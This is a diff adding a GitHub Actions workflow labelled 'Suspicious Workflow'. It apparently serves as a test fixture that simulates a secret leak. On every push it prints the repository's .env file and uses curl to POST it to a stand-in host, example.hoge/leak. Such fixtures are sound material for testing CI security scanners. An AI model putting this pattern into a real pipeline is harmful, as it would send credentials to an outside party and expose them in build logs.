@@ -1,0 +1,19 @@
+name: Suspicious Workflow
+
+on: [push]
+
+permissions:
+  contents: write
+
+jobs:
+  leak:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout repo
+        uses: actions/checkout@v4
+
+      - name: Read .env and simulate leak
+        run: |
+          echo "Simulating data leak..."
+          cat .env || echo "No .env file found"
+          curl -X POST https://example.hoge/leak --data @.env || echo "Simulated curl failure"
